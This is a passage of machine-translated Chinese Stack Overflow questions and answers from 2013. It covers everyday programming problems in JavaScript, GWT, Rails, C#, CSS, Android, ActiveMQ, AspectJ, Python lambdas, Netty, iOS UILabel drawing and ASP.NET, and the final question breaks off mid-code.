如果您在加载所有图像后刷新`scrollspy`，您会发现偏移量是正确的。所以，问题是如何做到这一点。

一种解决方案是在每个图像上附加一个`onLoad`事件处理程序，然后`scrollspy`在处理程序内部刷新。一种简化的方法可能如下所示：

```
<script type="text/javascript">
    function refreshScrollspy() {
        $('[data-spy="scroll"]').each(function() {
            $(this).scrollspy('refresh');
        });
    }
    $(function() {
        refreshScrollspy();
    });
</script>

<img onload="refreshScrollspy()" src="assets/img/about-001.jpg" alt="Partnership"/> 
```

这是一个[有效的 jsfiddle 示例](http://jsfiddle.net/heston/pw69c6bh/1/)。请注意，必须在图像实际加载之前注册该图像的加载处理程序。否则，它不会被解雇。这就是我在这里使用内联事件处理程序的原因。一个更优雅的解决方案留给读者。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-03T08:46:57.103

我自己在尝试使用 Bootstrap 中的 Scrollspy 时遇到了这个问题，似乎脚本在计算时没有考虑到图像的高度，从而导致 Scrollspy 准确。

我相信这是因为图像没有设置高度。通过检查页面，我发现页面中包含的浮动图像的高度设置为**auto**，并且当我在 CSS 中的媒体查询后将​​其设置为特定值时，我的 Scrollspy 工作正常。

# gwt - GWT 和 JSNI - 实例方法缺少限定符

> ID：15772589
> 
> 赞同：0
> 
> 时间：2013-04-02T19:23:48.953
> 
> 标签：gwt, jsni, gwt-dev-mode

我正在通过开发模式调试和开发 GWT 模块。在启动 DM 时，我收到以下 JSNI 错误：“缺少实例方法的限定符”。但是，当我编译它时，我没有得到任何编译错误。是DM问题还是我的错？

提示：这是我试图在本机方法中访问的函数：

```
public static native void fbLogin () /*-{
    @pack1.pack2.pack3::someMethod(Ljava/lang/String;)(param);
}-*/; 
```

谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-02T20:32:31.160

您可以声明`someMethod`为`static`或将实例对象传递给您的 jsni 块：

```
public static native void fbLogin (pack3 instance) /*-{
   instance.@pack1.pack2.pack3::someMethod(Ljava/lang/String;)(param);
}-*/; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-08-08T07:47:18.763

您缺少`static`JSNI 函数正在调用的方法，Java 方法应该是

```
public static void someMethod(String param){
} 
```

# ruby-on-rails - Ruby on Rails，如何将参数传递给控制器 ？

> ID：15772595
> 
> 赞同：0
> 
> 时间：2013-04-02T19:24:15.827
> 
> 标签：ruby-on-rails, ruby-on-rails-3, model-view-controller, controller, parameter-passing

我有活动日历。我有创建新事件的标准链接（它是通过脚手架在视图中创建的）：

```
<%= link_to 'New Event', new_event_path %> 
```

现在我需要将相同的链接放到日历表的每一天，并将日期作为参数传递给控制器

我愿意：

```
<%= link_to '+', new_event_path(date) %> 
```

我想把它放在控制器中并做类似的事情

```
 def new
    @event = Event.new

    if params[:date]
      @event.date = params[:date]
    end

    respond_to do |format|
      format.html # new.html.erb
      format.json { render json: @event }
    end
  end 
```

但它不起作用。如果我点击我的新链接，我会得到类似的 URL`http://localhost:3000/events/new.2013-04-02` 和一个空白页面。

应该如何正确实现？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:35:16.240

您可以像这样传递附加信息：

```
<%= link_to '+', new_event_path(date: date) %> 
```

# c# - 如何在 C# 中撤消和重做（富文本框）

> ID：15772602
> 
> 赞同：5
> 
> 时间：2013-04-02T19:24:36.377
> 
> 标签：c#, winforms, visual-studio-2012

大约 3 天以来，我一直在尝试在我的文本编辑器中**撤消**和**重做工作。**它在我的脑海里。

我有一个文本框（名为`richTextBoxPrintCtrl1`），我希望能够**撤消**和 **重做 **（逐字）。

因此，如果我单击**撤消**按钮，它会*撤消*最后一个单词。如果我然后单击**重做**按钮，它*会重做*最后一个单词。

有人可以帮我解决这个问题吗？

`richTextBoxPrintCtrl1.Undo();`不能很好地工作。它会删除在文本框中键入的所有内容。

在此先感谢您的帮助。

我知道这个问题之前已经被问过很多次了，但是我无法使用我在 SO 上浏览过的问题中的信息来解决这个问题。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-02T20:09:31.467

好的，我将发布一些代码来帮助您入门。首先你需要监听`TextChanged`事件。

```
textBox1.TextChanged += new EventHandler(textBox1_TextChanged); 
```

你需要在类中声明一个堆栈

```
 Stack<string> undoList = new Stack<string>(); 
```

在文本更改处理程序中，您需要将文本框的内容添加到堆栈中

```
 void textBox1_TextChanged(object sender, EventArgs e)
    {
        undoList.Push(textBox1.Text);
    } 
```

然后你需要处理撤销，所以你可以简单地使用 CTRL-Z

```
 textBox1.KeyDown += new KeyEventHandler(textBox1_KeyDown);

void textBox1_KeyDown(object sender, KeyEventArgs e)
    {
         if(e.KeyCode == Keys.Z && (e.Control)) {
             textBox1.Text = undoList.Pop();
         }
    } 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-10-07T14:23:37.267

您可以让 RichTextBox 为您逐字构建撤消堆栈，并通过处理如下的 KeyDown-、KeyPress- 或 KeyUp 事件之一来跟踪插入符号的位置：

```
 private void rtb_KeyDown(object sender, KeyEventArgs e)
    {
        // Trick to build undo stack word by word
        RichTextBox rtb = (RichTextBox)sender;
        if (e.KeyCode == Keys.Space)
        {
            this.SuspendLayout();
            rtb.Undo();
            rtb.Redo();
            this.ResumeLayout();
        }
        // eztnap
    } 
```

由于 RichTextBox 为您完成了这项工作，您只需拨打电话`rtb.Undo()`或`rtb.Redo()`从任何您需要的地方拨打电话即可。

# html - 在有序列表中自定义 CSS 计数器

> ID：15772603
> 
> 赞同：1
> 
> 时间：2013-04-02T19:24:42.963
> 
> 标签：html, css

我想创建两个有序（彼此独立）的 HTML 列表，它们具有以下格式并从数字开始，如下所示：

```
2.1
2.2
2.3
2.4

2.1.1
2.1.2

2.2.1
2.2.2
2.2.3

2.3.1
2.3.2

2.4.1
2.4.2

```

我如何用 CSS 做到这一点？

任何帮助将不胜感激，因为我已经用尽了这里的资源来试图解决这个问题。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:56:25.793

尝试这个

```
ol {
  counter-reset: firststlevel; 
  list-style-type: none;
}
li:before {
  display: inline-block;
  content: counter(firststlevel);
  counter-increment: firststlevel;
  width: 2em;
  margin-left: -2em;
}
ol ol {
  counter-reset: secondlevel;
}
ol ol li:before{
  content:counter(firststlevel) "."counter(secondlevel);
  counter-increment: secondlevel;
}

ol ol ol {
   counter-reset: thirdlevel;
}
ol ol ol li:before{
  content:counter(firststlevel) "."counter(secondlevel)"."counter(thirdlevel);
  counter-increment: thirdlevel;
  text-indent:-5px;
}
```

```
<ol>
    <li>Main 1</li>
    <ol>
        <li>Child 1 of Main 1
        <ol>
            <li>Sub Child 1 of Child 1 of Main 1</li>
            <li>Sub Child 1 of Child 1 of Main 1</li>
        </ol>
        </li>
        <li>Child 2 of Main 1
             <ol>
            <li>Sub Child 1 of Child 2 of Main 1</li>
            <li>Sub Child 2 of Child 2 of Main 1</li>
        </ol>
        </li>
    </ol>
    <li>Main 2</li>
    <ol>
        <li>Child 1 of Main 2
            <ol>
            <li>Sub Child 1 of Child 1 of Main 2</li>
            <li>Sub Child 2 of Child 1 of Main 2</li>
        </ol>
        </li>
        <li>Child 2 of Main 2
             <ol>
            <li>Sub Child 1 of Child 2 of Main 2</li>
            <li>Sub Child 2 of Child 2 of Main 2</li>
            <li>Sub Child 3 of Child 2 of Main 2</li>
        </ol>
        </li>
    </ol>
</ol>
```

# java - 使用应用内结算 V3 (Android) 重置购买

> ID：15772606
> 
> 赞同：4
> 
> 时间：2013-04-02T19:24:50.220
> 
> 标签：java, android, in-app-purchase

我成功实现了应用内计费 V3，它适用于我的测试帐户。我有两件（真正的）非消耗品，一件是我购买并在我的 Google 结帐帐户中发现的账单。在我的应用程序中，已购买项目的状态是“已购买”，第二个是“未购买”——应该如此。

现在我想将此商品重置为未购买。已经在 Google 结帐中退款，无需任何更改（仍然购买）。

或者那不可能？

# websocket - 用于通过 websocket 踩踏的 ActiveMQ 故障转移

> ID：15772609
> 
> 赞同：3
> 
> 时间：2013-04-02T19:24:53.073
> 
> 标签：websocket, activemq, stomp

是否有一种解决方法来实现一个 activemq 故障转移以在 websocket 上进行踩踏？

我的网络浏览器中的 uri 是**ws://localhost:61614/stomp**，它工作正常。但是添加**故障转移:(ws://localhost:61614/stomp)**将不起作用。

感谢任何指导。

问候，

沃尔特

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T20:57:56.577

故障转移传输仅适用于 ActiveMQ 的基于 openwire 的协议。对于 stomp，您需要处理所有异常并在出现问题时重新连接。

# java - 如何从 Java 运行 ajc？

> ID：15772614
> 
> 赞同：2
> 
> 时间：2013-04-02T19:25:02.057
> 
> 标签：java, aop, aspectj

我正在尝试`ajc`从 Java 运行编译器（而不是从 Maven 或 Ant！）。问题是我需要哪个 Maven 依赖项，哪个类是入口点？我现在最好的选择是`org.aspectj.tools.ajc.Main`from `org.aspectj:aspectjtools:1.7.2`。我对吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T15:21:52.360

是的。在您的 Java 项目中，您需要`aspectjrt.jar`（对于运行时）和`aspectjtools.jar`（对于编译器）类路径。然后您可以构建一个 AspectJ 项目并创建一个包含方面和类的 JAR 文件，如下所示：

```
import org.aspectj.tools.ajc.Main;

public class AjcRunner {
    public static void main(String[] args) throws Exception {
        String[] ajcArgs = {
            "-sourceroots", "c:\\my\\aspectj_project\\src",
            "-outjar", "my_aspects.jar"
        };
        Main.main(ajcArgs);
    }
} 
```

之后，您可以像这样在控制台上测试结果，假设您有一个`Application`带有`main`方法的类：

```
java -cp C:\path\to\aspectjrt.jar;my_aspects.jar Application 
```

# python - python中单行lambda函数中的条件语句？

> ID：15772617
> 
> 赞同：70
> 
> 时间：2013-04-02T19:25:12.883
> 
> 标签：python, if-statement, lambda, ternary-operator, conditional-operator

抱歉，如果以前有人问过这个问题，但我在任何地方都看不到。

基本上我遇到了一个场景，我需要在 lambda 函数中使用 if 语句。最困难的是理想情况下它需要在一行代码中（如果可能的话？）

通常，我会这样写：

```
T = 250

if (T > 200):
    rate = 200*exp(-T)
else:
    rate = 400*exp(-T)

return (rate) 
```

但是我需要它看起来像这样：

```
rate = lambda(T) : if (T>200): return(200*exp(-T)); else: return(400*exp(-T)) 
```

我意识到更容易做的事情是在 lambda 函数之外做出决策，然后为每种情况使用一个单独的 lambda 函数，但在这里并不适合。lambda 函数存储在一个数组中，并在需要时访问，每个数组元素对应一个特定的“速率”，因此对于相同的“速率”有两个单独的行会搞砸。任何帮助将不胜感激，或者如果不可能，其他人的一些确认会很好:)

* * *

## 回答 #1

> 赞同：109
> 
> 时间：2013-04-02T19:27:55.623

使用`exp1 if cond else exp2`语法。

```
rate = lambda T: 200*exp(-T) if T>200 else 400*exp(-T) 
```

请注意，您不要`return`在 lambda 表达式中使用。

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2013-04-02T19:45:37.240

正确的方法很简单：

```
def rate(T):
    if (T > 200):
        return 200*exp(-T)
    else:
        return 400*exp(-T) 
```

在这里使用绝对没有优势`lambda`。唯一的`lambda`好处是允许您创建匿名函数并在表达式中使用它们（而不是语句）。如果您立即将 分配`lambda`给一个变量，则它不再是匿名的，而是在语句中使用，因此您只是无缘无故地降低了代码的可读性。

以这种方式定义的`rate`函数可以以与 lambda 函数完全相同的方式存储在数组中、传递、调用等。它将完全相同（除了更容易调试、内省等）。

* * *

来自评论：

> 那么函数需要放在一行中，我认为您不能使用命名函数来做到这一点？

我无法想象为什么该函数需要放在一行中的任何充分理由。但可以肯定的是，您可以使用命名函数来做到这一点。在你的解释器中试试这个：

```
>>> def foo(x): return x + 1 
```

* * *

> 这些函数也存储为字符串，然后使用“eval”进行评估，我不确定如何处理常规函数。

同样，虽然很难 100% 确定你为什么要这样做，但我至少 99% 确定你没有理由或不好的理由这样做。几乎任何时候你认为你想将 Python 函数作为字符串传递并调用`eval`以便你可以使用它们，你实际上只是想将 Python 函数作为函数传递并将它们作为函数使用。

但是如果这真的是你在这里需要的：只需使用`exec`而不是`eval`.

您没有提到您使用的是哪个版本的 Python。在 3.x 中，该[`exec`](http://docs.python.org/3/library/functions.html#exec)函数具有与该函数完全相同的签名`eval`：

```
exec(my_function_string, my_globals, my_locals) 
```

在 2.7 中，[`exec`](http://docs.python.org/2/reference/simple_stmts.html#exec)是一个语句，而不是一个函数——但是您仍然可以使用与 3.x 中相同的语法来编写它（只要您不尝试将返回值分配给任何东西）并且它可以工作。

在早期的 2.x（我认为是 2.6 之前？）中，您必须这样做：

```
exec my_function_string in my_globals, my_locals 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2013-04-02T19:28:26.767

是的，您可以使用`if`语句的简写语法。

```
rate = lambda(t): (200 * exp(-t)) if t > 200 else (400 * exp(-t)) 
```

请注意，您也不在s 中使用显式`return`语句。`lambda`

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2013-10-05T23:32:43.063

我发现我可以在 lambda 中使用“if-then”语句。例如：

```
eval_op = {
    '|'  : lambda x,y: eval(y) if (eval(x)==0) else eval(x),
    '&'  : lambda x,y: 0 if (eval(x)==0) else eval(y),
    '<'  : lambda x,y: 1 if (eval(x)<eval(y)) else 0,
    '>'  : lambda x,y: 1 if (eval(x)>eval(y)) else 0,
} 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2013-04-02T19:46:27.600

当你说`rate = lambda whatever...`你已经打败了 lambda 并且应该只定义一个函数时。但是，如果你想要一个 lambda，你可以使用 'and' 和 'or'

```
lambda(T): (T>200) and (200*exp(-T)) or (400*exp(-T)) 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2020-06-12T04:31:39.893

如果你想更懒一点：

```
#syntax lambda x : (false,true)[Condition] 
```

在你的情况下：

```
rate = lambda(T) : (400*exp(-T),200*exp(-T))[T>200] 
```

# java - 如何解码来自 http 请求的响应并使用 netty 中的内容？

> ID：15772620
> 
> 赞同：0
> 
> 时间：2013-04-02T19:25:20.273
> 
> 标签：java, netty

这与[这个问题有关](https://stackoverflow.com/questions/15693158/simple-way-to-use-netty-to-build-an-http-proxy-server)，但我试图将我的问题分解成更小的步骤。

我正在尝试使用接收http请求的netty编写一个简单的http服务器（服务器A），向另一台服务器（服务器B）发出http请求，然后将响应中的内容复制到对初始请求的响应中。我知道有一些如何做到这一点的例子，比如 LittleProxy，但代码相当复杂，而且由于我是 netty 的 n00b，我试图让我的第一个代码尽可能简单，而不会进入杂草。

现在，我忽略了所有关于并发的问题，只建立了一个从服务器 A 到服务器 B 的通道（我知道这会因并发请求而严重中断，但它使我的初始任务更简单）。

我的方法如下：

1.  设置客户端引导程序并连接到在 localhost 端口 18080 上运行的服务器 B。获取相应的通道。

2.  启动服务器 A 在端口 2080 上侦听，使用管道解码 http 请求，然后写入到服务器 B 的通道。

3.  向生成的通道 future 添加一个侦听器，它将从服务器 B 的响应内容复制到对原始客户端对服务器 A 的请求的响应。

这是我的代码（非常短），我正在尝试完全按照我上面的描述进行操作。我的问题是我不知道如何将服务器 B 的响应复制到服务器的响应。当我在服务器 A 发送的响应中写入原始客户端时，我想出的一种方法会导致 IllegalArgumentException（我检查了 ChannelBuffer 的内容，并且代理服务器返回了正确的文本）。我在下面粘贴了异常的部分堆栈跟踪。欢迎其他评论，因为除了明显缺乏对服务器 B 的通道锁定之外，我可能还会犯其他错误：

```
public class NettyExample {

private static Channel channel;
private static Map<Channel, Channel> proxyToClient = new ConcurrentHashMap<Channel, Channel>();

public static void main(String[] args) throws Exception {
    ChannelFactory clientFactory =
            new NioClientSocketChannelFactory(
                    Executors.newCachedThreadPool(),
                    Executors.newCachedThreadPool());
    final ClientBootstrap cb = new ClientBootstrap(clientFactory);
    cb.setPipelineFactory(new ChannelPipelineFactory() {
        public ChannelPipeline getPipeline() {
            return Channels.pipeline(
                    new HttpRequestEncoder(),
                    new HttpResponseDecoder(),
                    new ResponseHandler());
        }
    });
    ChannelFuture cf = cb.connect(new InetSocketAddress("localhost", 18080));
    channel = cf.awaitUninterruptibly().getChannel();

    ChannelFactory factory =
            new NioServerSocketChannelFactory(
                    Executors.newCachedThreadPool(),
                    Executors.newCachedThreadPool());
    ServerBootstrap sb = new ServerBootstrap(factory);

    sb.setPipelineFactory(new ChannelPipelineFactory() {
        public ChannelPipeline getPipeline() {
            return Channels.pipeline(
                    new HttpRequestDecoder(),
                    new RequestHandler());
        }
    });

    sb.setOption("child.tcpNoDelay", true);
    sb.setOption("child.keepAlive", true);

    sb.bind(new InetSocketAddress(2080));
}

private static class ResponseHandler extends SimpleChannelHandler {

    @Override
    public void messageReceived(ChannelHandlerContext ctx, final MessageEvent e) {
        final HttpResponse proxyResponse = (HttpResponse) e.getMessage();
        Channel clientChannel = proxyToClient.get(e.getChannel());
        HttpResponse clientResponse = new DefaultHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);
        clientResponse.setContent(proxyResponse.getContent());
        clientChannel.write(clientResponse).addListener(new ChannelFutureListener() {
            public void operationComplete(ChannelFuture future) {
                Channel ch = future.getChannel();
                ch.close();
            }
        });
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, ExceptionEvent e) {
        e.getCause().printStackTrace();
        Channel ch = e.getChannel();
        ch.close();
    }
}

private static class RequestHandler extends SimpleChannelHandler {

    @Override
    public void messageReceived(ChannelHandlerContext ctx, final MessageEvent e) {
        final HttpRequest request = (HttpRequest) e.getMessage();
        System.out.println("calling client channel");
        proxyToClient.put(channel, e.getChannel());
        channel.write(request);
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, ExceptionEvent e) {
        e.getCause().printStackTrace();
        Channel ch = e.getChannel();
        ch.close();
    }
}
} 
```

这个中继调用似乎有效，直到调用 clientChannel.write(clientResponse)。在那里，会生成以下异常：

```
java.lang.IllegalArgumentException: unsupported message type: class org.jboss.netty.handler.codec.http.DefaultHttpResponse
    at org.jboss.netty.channel.socket.nio.SocketSendBufferPool.acquire(SocketSendBufferPool.java:53)
    at org.jboss.netty.channel.socket.nio.AbstractNioWorker.write0(AbstractNioWorker.java:468)
    at org.jboss.netty.channel.socket.nio.AbstractNioWorker.writeFromTaskLoop(AbstractNioWorker.java:432) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T22:57:48.800

您需要设置一个客户端管道来等待响应，然后将其写入您的响应。

请参阅 snoop 客户端[示例](https://github.com/netty/netty/tree/3/src/main/java/org/jboss/netty/example/http/snoop)；具体来说，[HttpSnoopClientHandler](https://github.com/netty/netty/blob/3/src/main/java/org/jboss/netty/example/http/snoop/HttpSnoopClientHandler.java)。

# android - 适配器中的 Android NullPointException

> ID：15772623
> 
> 赞同：1
> 
> 时间：2013-04-02T19:25:39.340
> 
> 标签：android, nullpointerexception

有什么问题？请参阅上面的代码。

日志错误：

```
04-02 18:14:27.294: E/AndroidRuntime(1931): FATAL EXCEPTION: main
04-02 18:14:27.294: E/AndroidRuntime(1931): java.lang.NullPointerException
04-02 18:14:27.294: E/AndroidRuntime(1931):     at com.insidetec.itfeed.EfficientAdapter.getView(EfficientAdapter.java:89)
04-02 18:14:27.294: E/AndroidRuntime(1931):     at android.widget.AbsListView.obtainView(AbsListView.java:2159)
04-02 18:14:27.294: E/AndroidRuntime(1931):     at android.widget.ListView.makeAndAddView(ListView.java:1831)
04-02 18:14:27.294: E/AndroidRuntime(1931):     at android.widget.ListView.fillDown(ListView.java:674)
04-02 18:14:27.294: E/AndroidRuntime(1931):     at android.widget.ListView.fillFromTop(ListView.java:735)
04-02 18:14:27.294: E/AndroidRuntime(1931):     at android.widget.ListView.layoutChildren(ListView.java:1652)
04-02 18:14:27.294: E/AndroidRuntime(1931):     at android.widget.AbsListView.onLayout(AbsListView.java:1994)
04-02 18:14:27.294: E/AndroidRuntime(1931):     at 
```

EfficientAdapter.java（显示帖子的适配器，提取 XML）：

```
public class EfficientAdapter extends BaseAdapter {
private Activity activity;
private ArrayList<Post> data;
private static LayoutInflater inflater = null;
//public ImageLoader imageLoader;
ViewHolder holder;

EfficientAdapter(Activity a, ArrayList<Post> d) {

    activity = a;
    data = d;
    inflater = (LayoutInflater) activity
            .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
//  imageLoader = new ImageLoader(activity.getApplicationContext());

}

@Override
public int getCount() {
    return data.toArray().length;

}

@Override
public Object getItem(int position) {

    return position;
}

@Override
public long getItemId(int position) {

    return position;
}

public static class ViewHolder {
    public TextView label;
    public TextView addr;
    public ImageView image;
}

@Override
public View getView(int position, View convertView, ViewGroup parent) {
    View vi = convertView;

    if (convertView == null) {
        vi = inflater.inflate(R.layout.rows, null);
        holder = new ViewHolder();
        holder.label = (TextView) vi.findViewById(R.id.title);
        holder.addr = (TextView) vi.findViewById(R.id.details);
        holder.image = (ImageView) vi.findViewById(R.id.thumb);
        vi.setTag(holder);
    } else
        holder = (ViewHolder) vi.getTag();

    holder.label.setText(data.get(position).getTitle());
    holder.addr.setText(data.get(position).getPubDate());

//      imageLoader.DisplayImage((data.get(position).getThumbnail()), activity,
//              holder.image, 72, 72);
    URL url = null;
    try {
        url = new URL((data.get(position).getThumbnail()));
    } catch (MalformedURLException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
    InputStream content = null;
    try {
        content = (InputStream)url.getContent();
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
    Drawable d = Drawable.createFromStream(content , "src"); 
    Bitmap mIcon1 = null;
     try {
         mIcon1 =
                BitmapFactory.decodeStream(url.openConnection().getInputStream());
    } catch (IOException e) {
        e.printStackTrace();
    }
    holder.image.setImageBitmap(Bitmap.createScaledBitmap(mIcon1, 72, 72, false));

    return vi;
} 
```

我找不到日志中显示的错误！我想为我的网站创建一个 RSS 提要。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:32:11.617

这条线

```
holder.image.setImageBitmap(Bitmap.createScaledBitmap(mIcon1, 72, 72, false)); 
```

导致异常，因为你`mIcon1`是`null`

你不能以这种方式检索你的图像

```
 mIcon1 =    BitmapFactory.decodeStream(url.openConnection().getInputStream()); 
```

你可能会得到 NetworkOnMainThreadException 和 NullPointerException 因为你`mIcon`是 null

尝试使用[UniversalImageDownloader](https://github.com/nostra13/Android-Universal-Image-Loader)

# javascript - 使用 Canvas 和 JavaScript 进行多边形表示的图像采样算法？

> ID：15772626
> 
> 赞同：5
> 
> 时间：2013-04-02T19:25:43.113
> 
> 标签：javascript, html, image, algorithm, canvas

首先，我不习惯处理图像，所以如果我的措辞不对，请原谅。

我正在寻找一个放在 HTML5 画布上的图像，对其进行采样，减少采样，然后使用主要是三角形和一些其他多边形来创建图像的多边形表示，并将该图像绘制到画布上。

但是我不知道从哪里开始使用算法来做到这一点。这种算法需要什么样的伪代码？

此图像可以更好地理解最终结果：

[![](https://i.stack.imgur.com/LMmRp.png)](https://tinypic.com/view.php?pic=1hcj2d&s=6)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-03T13:03:08.860

我会做以下事情：

1.  创建一个由随机放置的点组成的字段。
2.  从点 创建一个[Voronoi 图。](http://en.wikipedia.org/wiki/Voronoi_diagram)
    *   这是我过去为此使用过的一个很好的 JavaScript 库：[https ://github.com/gorhill/Javascript-Voronoi](https://github.com/gorhill/Javascript-Voronoi)
3.  根据对颜色的采样为每个单元格着色。
    *   *你只是在点上选择颜色吗？对单元格内的所有颜色进行采样并将它们平均？按单元格中心加权平均值？每个都会产生不同但可能有趣的结果。*

如果结果需要是三角形而不是多边形，则创建一个[Delaunay triangulation](http://en.wikipedia.org/wiki/Delaunay_triangulation)而不是 Voronoi 图。GitHub[为此提供了 15 个 JavaScript 库](https://github.com/search?l=JavaScript&q=Delaunay&ref=commandbar&type=Repositories)，但我还没有尝试任何能够专门推荐的库。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-02T19:58:21.663

好吧，这有点间接，但是这里......！

这是一个 SVG 插件，可将图像转换为点化艺术：[https ://github.com/gsmith85/SeuratJS/blob/master/seurat.js](https://github.com/gsmith85/SeuratJS/blob/master/seurat.js)

这是有趣的部分。在引擎盖下，它使用**画布**进行处理！

示例显示由“点”和“正方形”组成的图像。

也许您可以修改代码来生成三角形——甚至只是对角切割正方形来创建三角形。

# ios - 填充uilabel，自定义uilabel的渐变时文本消失

> ID：15772630
> 
> 赞同：0
> 
> 时间：2013-04-02T19:25:57.793
> 
> 标签：ios, objective-c, core-graphics, uilabel

我的目标是通过执行以下操作为我的 uilabel 添加渐变（CustomLabelBackGround**是**UILabel 的子类）

```
@implementation CustomLabelBackGround

- (id)initWithFrame:(CGRect)frame {
    if ((self = [super initWithFrame:frame])) {
        // Initialization code
    }
    return self;
}

- (void)drawRect:(CGRect)rect {    
    CGContextRef context        =   UIGraphicsGetCurrentContext();

    CGColorRef whiteColor       =   [UIColor colorWithRed:1.0 green:1.0 blue:1.0 alpha:1.0].CGColor;
    CGColorRef lightGrayColor   =   [UIColor colorWithRed:230.0/255.0 green:230.0/255.0 blue:230.0/255.0 alpha:1.0].CGColor;
    CGColorRef separatorColor   =   [UIColor colorWithRed:208.0/255.0 green:208.0/255.0 blue:208.0/255.0 alpha:1.0].CGColor;

    CGRect paperRect            =   self.bounds;

    // Fill with gradient
    drawLinearGradient(context, paperRect, whiteColor, lightGrayColor);

    // Add white 1 px stroke
    CGRect strokeRect           =   paperRect;
    strokeRect.size.height     -=   1;
    strokeRect                  =   rectFor1PxStroke(strokeRect);

    CGContextSetStrokeColorWithColor(context, whiteColor);
    CGContextSetLineWidth(context, 1.0);
    CGContextStrokeRect(context, strokeRect);

    // Add separator
    CGPoint startPoint          =   CGPointMake(paperRect.origin.x, paperRect.origin.y + paperRect.size.height - 1);
    CGPoint endPoint            =   CGPointMake(paperRect.origin.x + paperRect.size.width - 1, paperRect.origin.y + paperRect.size.height - 1);
    draw1PxStroke(context, startPoint, endPoint, separatorColor);

} 
```

但是，当我尝试在屏幕上显示时，CustomLabelBackGround 的文本正在消失。请看下面的图片作为参考：

![在此处输入图像描述](https://i.stack.imgur.com/AfwDt.png)

我在这里缺少什么。如果您对此有任何想法，请提供帮助。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-09-11T09:43:31.543

您需要致电：

```
[super drawRect:rect]; 
```

为了在绘制其他任何内容之前超级绘制您的文本。然后正常绘制文本

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T20:25:24.837

我会：

1.  创建一个自定义 UIView，并在那里使用您的 drawRect 代码。
2.  确保 UILabel 背景设置为 [UIColor clearColor]。
3.  添加自定义 UILabel 类作为自定义 UIView 类的子视图。

或者就像 Imram 所说的那样，在 Photoshop 或其他图形编辑器程序中将渐变创建为图像，并在那里设置标签背景。就个人而言，我认为这可能是最简单和最可维护的解决方案。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-02T19:31:36.693

由于您正在实现`drawRect`您`UILabel`拥有该图形上下文，因此您基本上是“覆盖”文本，您也可以自己绘制它，或者更简单的方法是拥有一个带有渐变的容器视图和一个透明标签文本。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-02T19:32:26.073

最好的方法

*   创建自定义 UIView
*   在那里制作这个drawrect
*   在这个 UILabel 类中，将该类作为背景添加到标签中

否则，您还必须绘制标签内容，因为您要覆盖其`drawrect`方法

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-02T19:47:17.893

为什么不在 Photoshop 中预渲染渐变，然后在您的标签上设置：

```
myLabel.backgroundColor = [UIColor colorWithPatternImage:[UIImage imageNamed:@"myImage"]]; 
```

# c# - 为什么在 asp.net 中取消选中复选框时不会触发 checkchanged 事件

> ID：15772642
> 
> 赞同：5
> 
> 时间：2013-04-02T19:26:37.180
> 
> 标签：c#, asp.net, checkbox

考勤跟踪器应用程序的一部分，它显示用户的主题并让他标记自己的考勤。

使用 enableviewstate="true"，复选框不会被取消选中，并且 checkchanged 事件不会执行。

```
namespace portal

{

    public partial class tracker : System.Web.UI.Page
    {

        String[] split; string day;
        protected void Page_Load(object sender, EventArgs e)
        {

            /* if (Session["uname"] == null)
             {
                 Response.Redirect("Firstpage.aspx");
             }*/
            String[] split = new String[16];
            DateTime d1 = DateTime.Today;
            string month = d1.ToString("MMMM");
            Lblmonth.Text = month;
            String userid = Session["uname"].ToString();
            SqlConnection con2 = new SqlConnection(@"Data Source=.\SQLEXPRESS;AttachDbFilename=F:\mmm\portal\App_Data\student.mdf;Integrated Security=True;User Instance=True");
            SqlCommand cmd2 = new SqlCommand("select sbranch ,syear from studdetails where userid=@userid ", con2);
            cmd2.Parameters.AddWithValue("userid", userid);
            String branch = "", year = "";
            SqlDataReader rdr2 = null;
            con2.Open();
            rdr2 = cmd2.ExecuteReader();
            while (rdr2.Read())
            {
                branch = rdr2["sbranch"].ToString();
                year = rdr2["syear"].ToString();
            }
            con2.Close();
            int sem = 0;
            switch (year)
            {
                case "B.E": sem = 8;
                    break;
                case "T.E": sem = 6;
                    break;
                case "S.E": sem = 4;
                    break;
                case "F.E": sem = 2;
                    break;
                default: sem = 2;
                    break;

            }

            int tempmonth = (int)(d1.Month);
            if (tempmonth > 6)
                sem = sem - 1;

            SqlConnection con3 = new SqlConnection(@"Data Source=.\SQLEXPRESS;AttachDbFilename=F:\mmm\portal\App_Data\student.mdf;Integrated Security=True;User Instance=True");
            SqlCommand cmd3 = new SqlCommand("select subject from subjecttable where department=@dept and semester=@sem ", con3);
            cmd3.Parameters.AddWithValue("dept", branch);
            cmd3.Parameters.AddWithValue("sem", sem);
            con3.Open();
            SqlDataReader rdr3 = null;
            rdr3 = cmd3.ExecuteReader();
            string subject = "";
            while (rdr3.Read())
            {
                subject = rdr3["subject"].ToString();

            }
            con3.Close();
